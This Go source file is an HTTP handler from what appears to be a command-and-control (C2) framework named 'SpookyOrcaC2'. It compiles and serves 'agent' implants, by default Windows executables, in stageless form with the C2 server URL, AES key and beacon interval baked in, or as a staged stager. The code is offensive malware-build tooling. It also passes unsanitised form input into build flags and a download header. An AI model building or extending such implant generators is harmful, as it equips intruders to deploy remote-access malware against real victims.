package handlers

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
)

func BuildAgentHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}

	r.ParseForm()

	buildType := r.FormValue("buildType")
	osTarget := r.FormValue("os")
	arch := r.FormValue("arch")
	serverURL := r.FormValue("serverURL")
	aesKey := r.FormValue("aesKey")
	interval := r.FormValue("interval")

	if osTarget == "" {
		osTarget = "windows"
	}
	if arch == "" {
		arch = "amd64"
	}
	if serverURL == "" {
		serverURL = "http://127.0.0.1:8080"
	}
	if aesKey == "" {
		aesKey = "SpookyOrcaC2AES1"
	}
	if interval == "" {
		interval = "5"
	}
	if buildType == "" {
		buildType = "stageless"
	}

	outputName := "agent"
	if osTarget == "windows" {
		outputName += ".exe"
	}

	// Argumen untuk go build
	cmdArgs := []string{"build", "-o", outputName}

	// “Stageless” => param di-embed via -ldflags
	if buildType == "stageless" {
		ldFlags := fmt.Sprintf("-X main.defaultServerURL=%s -X main.defaultKey=%s -X main.defaultInterval=%s",
			serverURL, aesKey, interval,
		)
		cmdArgs = append(cmdArgs, "-ldflags", ldFlags)
		// GANTI path jadi "../agent_stageless" (relative ke server/handlers)
		cmdArgs = append(cmdArgs, "./agent_stageless")
	} else {
		// “staged”: compile stager.go di folder ../agent_staged
		cmdArgs = append(cmdArgs, "./agent_staged/stager.go")
	}

	cmd := exec.Command("go", cmdArgs...)
	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, "GOOS="+osTarget, "GOARCH="+arch)
	// cmd.Env = append(cmd.Env, "CGO_ENABLED=0") // optional

	output, err := cmd.CombinedOutput()
	if err != nil {
		msg := fmt.Sprintf("Failed to build agent:\n%s\nError: %v", output, err)
		http.Error(w, msg, http.StatusInternalServerError)
		return
	}

	// Pastikan browser menamai file dengan outputName
	w.Header().Set("Content-Disposition", "attachment; filename="+outputName)
	http.ServeFile(w, r, outputName)
}
